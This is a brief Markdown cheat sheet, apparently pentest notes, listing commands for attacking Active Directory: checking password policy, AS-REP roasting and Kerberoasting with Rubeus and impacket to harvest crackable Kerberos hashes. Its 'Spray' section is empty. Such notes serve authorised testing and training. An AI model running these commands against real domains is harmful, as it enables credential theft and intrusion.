#### Check Policy
```
crackmapexec <ip> -u <user> -p <password> --pass-pol
enum4linux -u <user> -p <pass> -P <ip>
net accounts
```

#### Spray
```

```

#### AS-REP Roasting
```
#Gets all users.
impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>

#Roasting
.\Rubeus.exe asreproast /nowrap
impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile <hashes.txt>
```
#### Kerberoasting
```
#Roasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
impacket-GetUserSPNs --request -dc-ip <ip> <domain>/<user>:<password>
```